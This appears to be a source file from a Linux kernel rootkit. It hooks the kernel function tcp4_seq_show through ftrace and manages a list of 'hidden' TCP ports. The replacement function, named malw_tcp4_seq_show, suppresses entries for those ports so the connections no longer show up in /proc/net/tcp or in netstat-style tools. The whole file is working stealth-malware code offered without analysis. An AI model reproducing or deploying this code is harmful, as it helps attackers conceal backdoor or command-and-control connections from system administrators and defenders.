#include "tcp_seq_show.h"
#include "ftrace_helper.h"

int tcp_port_size = 0;

int *hidden_tcp_ports;

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
//static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

struct ftrace_hook hook_tcp4_seq_show = HOOK("tcp4_seq_show", malw_tcp4_seq_show, &orig_tcp4_seq_show);

void add_hidden_port(int port) 
{
	tcp_port_size++;
	hidden_tcp_ports = krealloc(hidden_tcp_ports, tcp_port_size*sizeof(int), GFP_KERNEL);
	*(hidden_tcp_ports + tcp_port_size - 1) = port;
}

void remove_hidden_port(int port) 
{
	int i;
	int move = 0;
	for (i = 0; i < tcp_port_size; i++) {
		if (*(hidden_tcp_ports + i) == port) {
			move = 1;	
			continue;
		}
		if (move) {
			*(hidden_tcp_ports + i - 1) = *(hidden_tcp_ports + i); 
		}
	}
	if (tcp_port_size > 0 && move) {
		tcp_port_size--;
		hidden_tcp_ports = krealloc(hidden_tcp_ports, tcp_port_size*sizeof(int), GFP_KERNEL);
	}
}

void install_tcp_seq_show_hook(void) {
	fh_install_hook(&hook_tcp4_seq_show);
}

void remove_tcp_seq_show_hook(void) {
	fh_remove_hook(&hook_tcp4_seq_show);
	kfree(hidden_tcp_ports);
}

asmlinkage long malw_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int i;
	long ret;
	struct sock *sk = v;


	for (i = 0; i < tcp_port_size; i++) {
		if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_tcp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_tcp_ports + i))) {
			return 0;
		}
	}
	
	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

